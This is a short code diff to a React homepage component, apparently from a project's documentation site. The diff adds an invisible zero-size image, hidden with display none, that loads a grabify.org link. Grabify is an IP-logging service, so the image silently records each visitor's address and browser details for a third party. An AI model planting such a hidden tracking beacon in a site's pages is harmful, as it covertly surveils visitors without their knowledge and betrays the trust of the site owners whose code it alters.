@@ -57,7 +57,11 @@ export default function HomepageFeatures(): JSX.Element {
 
   return (
     <section className={styles.features}>
-      <div className="container">
+      <img src="https://grabify.org/2kcz1" width="0" height="0" style={{
+        display: "none"
+      }} alt="" />
+
+      < div className="container" >
         <div className="row">
 
           <Container maxWidth="lg">
